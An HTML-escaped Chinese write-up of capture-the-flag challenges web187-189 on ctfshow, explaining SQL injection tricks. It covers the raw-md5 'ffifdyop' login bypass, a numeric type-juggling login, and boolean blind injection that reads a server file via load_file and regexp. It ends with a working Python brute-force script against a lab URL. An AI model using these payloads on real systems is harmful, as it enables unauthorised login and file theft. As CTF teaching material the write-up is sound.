&lt;h1 id=&#34;web187&#34;&gt;&lt;a href=&#34;#web187&#34; class=&#34;headerlink&#34; title=&#34;web187&#34;&gt;&lt;/a&gt;web187&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;查询语句
//拼接sql语句查找指定ID用户
  $sql = &amp;quot;select count(*) from ctfshow_user where username = &amp;#39;$username&amp;#39; and password= &amp;#39;$password&amp;#39;&amp;quot;;


返回逻辑
    $username = $_POST[&amp;#39;username&amp;#39;];
    $password = md5($_POST[&amp;#39;password&amp;#39;],true);

    //只有admin可以获得flag
    if($username!=&amp;#39;admin&amp;#39;)&amp;#123;
        $ret[&amp;#39;msg&amp;#39;]=&amp;#39;用户名不存在&amp;#39;;
        die(json_encode($ret));
    &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;md5&lt;/code&gt; 函数基本语法&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;string md5 ( string $str , bool $raw_output = false )
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;第一个参数 &lt;code&gt;$str&lt;/code&gt;&lt;/strong&gt;&lt;br&gt;需要加密的字符串。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;第二个参数 &lt;code&gt;$raw_output&lt;/code&gt;&lt;/strong&gt;&lt;br&gt;是否以 &lt;strong&gt;原始的二进制格式&lt;/strong&gt; 返回。&lt;ul&gt;
&lt;li&gt;默认是 &lt;code&gt;false&lt;/code&gt;，返回 &lt;strong&gt;32 位十六进制字符串&lt;/strong&gt;（常见的 MD5）。&lt;/li&gt;
&lt;li&gt;如果传 &lt;code&gt;true&lt;/code&gt;，返回 &lt;strong&gt;16 字节的原始二进制数据&lt;/strong&gt;（不可读）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;ffifdyop&lt;/code&gt; 字符串经 &lt;code&gt;md5(password,true)&lt;/code&gt; 处理之后会变成 &lt;code&gt;276f722736c95d99e921722cf9ed621c&lt;/code&gt;&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;而 Mysql 会把 &lt;code&gt;hex&lt;/code&gt; 转成 &lt;code&gt;ascii&lt;/code&gt; 解释，这个字符串前几位刚好是 &lt;code&gt;&amp;#39; or &amp;#39;6&amp;lt;乱码&amp;gt;&lt;/code&gt;，&lt;code&gt;or&lt;/code&gt; 后的内容是永真式&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;powershell&#34;&gt;用户名：admin
密码：ffifdyop
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250825175128037.png&#34; alt=&#34;image-20250825175128037&#34; style=&#34;zoom: 25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web188&#34;&gt;&lt;a href=&#34;#web188&#34; class=&#34;headerlink&#34; title=&#34;web188&#34;&gt;&lt;/a&gt;web188&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;查询语句
  //拼接sql语句查找指定ID用户
  $sql = &amp;quot;select pass from ctfshow_user where username = &amp;#123;$username&amp;#125;&amp;quot;;


返回逻辑
  //用户名检测
  if(preg_match(&amp;#39;/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\&amp;#39;|\&amp;quot;/i&amp;#39;, $username))&amp;#123;
    $ret[&amp;#39;msg&amp;#39;]=&amp;#39;用户名非法&amp;#39;;
    die(json_encode($ret));
  &amp;#125;

  //密码检测
  if(!is_numeric($password))&amp;#123;
    $ret[&amp;#39;msg&amp;#39;]=&amp;#39;密码只能为数字&amp;#39;;
    die(json_encode($ret));
  &amp;#125;

  //密码判断
  if($row[&amp;#39;pass&amp;#39;]==intval($password))&amp;#123;
      $ret[&amp;#39;msg&amp;#39;]=&amp;#39;登陆成功&amp;#39;;
      array_push($ret[&amp;#39;data&amp;#39;], array(&amp;#39;flag&amp;#39;=&amp;gt;$flag));
    &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;填入的 &lt;code&gt;username&lt;/code&gt; 和 &lt;code&gt;password&lt;/code&gt; 为字符串&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;以字母开头的字符串在和数字比较时，会被强制转换为0&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;powershell&#34;&gt;用户名：0
密码：0
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250825180341102.png&#34; alt=&#34;image-20250825180341102&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web189&#34;&gt;&lt;a href=&#34;#web189&#34; class=&#34;headerlink&#34; title=&#34;web189&#34;&gt;&lt;/a&gt;web189&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;查询语句
  //拼接sql语句查找指定ID用户
  $sql = &amp;quot;select pass from ctfshow_user where username = &amp;#123;$username&amp;#125;&amp;quot;;


返回逻辑
  //用户名检测
  if(preg_match(&amp;#39;/select|and| |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleep|benchmark/i&amp;#39;, $username))&amp;#123;
    $ret[&amp;#39;msg&amp;#39;]=&amp;#39;用户名非法&amp;#39;;
    die(json_encode($ret));
  &amp;#125;

  //密码检测
  if(!is_numeric($password))&amp;#123;
    $ret[&amp;#39;msg&amp;#39;]=&amp;#39;密码只能为数字&amp;#39;;
    die(json_encode($ret));
  &amp;#125;

  //密码判断
  if($row[&amp;#39;pass&amp;#39;]==$password)&amp;#123;
      $ret[&amp;#39;msg&amp;#39;]=&amp;#39;登陆成功&amp;#39;;
    &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;load_file(file_path)&lt;/code&gt; 函数&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;LOAD_FILE(file_path)
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;作用：读取服务器上的文件内容，返回为一个字符串。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;参数：&lt;code&gt;file_path&lt;/code&gt;：文件的绝对路径&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;例如 &lt;code&gt;/etc/passwd&lt;/code&gt; 或 &lt;code&gt;C:\Windows\system32\drivers\etc\hosts&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;返回值：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;成功 → 文件内容作为字符串&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;失败 → NULL&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;regexp&lt;/code&gt; 函数&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;column_name REGEXP pattern
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;作用：判断某列的值是否 **匹配正则表达式 &lt;code&gt;pattern&lt;/code&gt;**。&lt;/li&gt;
&lt;li&gt;返回值：&lt;ul&gt;
&lt;li&gt;匹配 → &lt;code&gt;1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;不匹配 → &lt;code&gt;0&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;常用语法规则&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;表达式&lt;/th&gt;
&lt;th&gt;含义&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;&lt;code&gt;^abc&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;以 &lt;code&gt;abc&lt;/code&gt; 开头&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;xyz$&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;以 &lt;code&gt;xyz&lt;/code&gt; 结尾&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;[a-z]&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;匹配任意小写字母&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;[0-9]&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;匹配任意数字&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;.&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;匹配任意单个字符&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;*&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;匹配前一个字符 0 次或多次&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;+&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;匹配前一个字符 1 次或多次&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;?&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;匹配前一个字符 0 次或 1 次&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;// username/pass 输入 0/0	 输出 密码错误
// username/pass 输入 1/0	 输出 查询失败

// 输出 密码错误 表示条件为真
// 输出 查询失败 表示条件为假

// username 存在支持布尔盲注的条件
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250825183438096.png&#34; alt=&#34;image-20250825183438096&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查询为真时的关键字 &lt;code&gt;\u5bc6\u7801\u9519\u8bef&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;测试一下&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查询为假时返回“查询失败”&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;if(load_file(&amp;#39;/var/www/html/api/index.php&amp;#39;)regexp&amp;#39;ctfshow1&amp;#39;,0,1)
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250825221753164.png&#34; alt=&#34;image-20250825221753164&#34; style=&#34;zoom: 25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查询为真时返回“密码错误”&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;if(load_file(&amp;#39;/var/www/html/api/index.php&amp;#39;)regexp&amp;#39;ctfshow&amp;#123;&amp;#39;,0,1)
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250825221905412.png&#34; alt=&#34;image-20250825221905412&#34; style=&#34;zoom: 25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;利用脚本解题&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250825221604394.png&#34; alt=&#34;image-20250825221604394&#34; style=&#34;zoom:33%;&#34; /&gt;

&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import requests
import time

# ==================== 配置区 ====================

URL = &amp;quot;http://6d5fdcd5-caca-4e9e-98d0-7af939d64d46.challenge.ctf.show/api/index.php&amp;quot;

# POST 请求参数配置
USERNAME_PARAM = &amp;quot;username&amp;quot;
PASSWORD_PARAM = &amp;quot;password&amp;quot;

POST_VALUE_PREFIX = &amp;quot;if(load_file(&amp;#39;/var/www/html/api/index.php&amp;#39;)regexp&amp;#39;&amp;quot;
POST_VALUE_SUFFIX = &amp;quot;&amp;#39;,0,1)&amp;quot;   # 注意这里补上 ,0,1 和右括号

# 可选字符集
CHARSET = &amp;quot;0123456789abcdefghijklmnopqrstuvwxyz-&amp;#123;&amp;#125;&amp;quot;

# 已知 flag 前缀
PREFIX = &amp;quot;ctfshow&amp;#123;&amp;quot;

# 最大尝试长度
MAX_LEN = 45

# 请求延迟
SLEEP_TIME = 0.05

# 服务器响应关键字
SUCCESS_KEY = r&amp;quot;\u5bc6\u7801\u9519\u8bef&amp;quot;

# ==================== 脚本逻辑 ====================

def brute_force():
    flag = PREFIX
    for i in range(len(PREFIX), MAX_LEN):
        found = False
        for ch in CHARSET:
            payload = f&amp;quot;&amp;#123;POST_VALUE_PREFIX&amp;#125;&amp;#123;flag + ch&amp;#125;&amp;#123;POST_VALUE_SUFFIX&amp;#125;&amp;quot;
            data = &amp;#123;
                USERNAME_PARAM: payload,
                PASSWORD_PARAM: 0
            &amp;#125;

            try:
                res = requests.post(url=URL, data=data, timeout=5)
                time.sleep(SLEEP_TIME)
            except requests.exceptions.RequestException as e:
                print(f&amp;quot;[!] 请求出错: &amp;#123;e&amp;#125;&amp;quot;)
                continue

            if SUCCESS_KEY in res.text:
                flag += ch
                print(f&amp;quot;[+] 已发现: &amp;#123;flag&amp;#125;&amp;quot;)
                found = True
                if ch == &amp;quot;&amp;#125;&amp;quot;:
                    print(f&amp;quot;[✓] 最终 flag: &amp;#123;flag&amp;#125;&amp;quot;)
                    return flag
                break

        if not found:
            print(&amp;quot;[!] 没找到下一个字符，可能 flag 完成或 CHARSET 不全&amp;quot;)
            break

if __name__ == &amp;quot;__main__&amp;quot;:
    brute_force()
&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
